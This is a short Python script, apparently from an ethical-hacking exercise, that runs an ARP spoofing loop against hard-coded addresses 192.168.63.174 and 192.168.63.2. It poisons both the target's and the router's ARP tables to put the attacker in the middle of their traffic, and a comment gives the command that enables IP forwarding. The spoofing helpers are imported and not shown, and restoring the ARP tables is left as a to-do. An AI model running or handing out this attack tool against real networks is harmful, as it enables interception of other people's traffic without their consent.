#/usr/bin/env python
import time
import sys

from helpers.utils import spoof, get_mac

# TO_DOS:
# 1.  Check port forwarding is enabled, and if no quit and give a warning.
# In Linux, the command is: echo 1 | sudo tee  /proc/sys/net/ipv4/ip_forward.

# 2. When we quit, restore the ARP tables in the router and the target.
# def restore(destination_ip, source_ip):



sent_packets_count = 0
try:
    while True:
        # Tell the Target Device I am the Router.
        spoof("192.168.63.174","192.168.63.2", get_mac)
        # Tell the Router I am the Target Device.
        spoof("192.168.63.2","192.168.63.174", get_mac)
        sent_packets_count += 2
        # Use ,end="" for python 3
        print("\r[+] Packet Count: " + str(sent_packets_count)),
        sys.stdout.flush()
        # Add a delay.
        time.sleep(2) # Can quit by pressing Ctrl+c
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ...... Quitting.")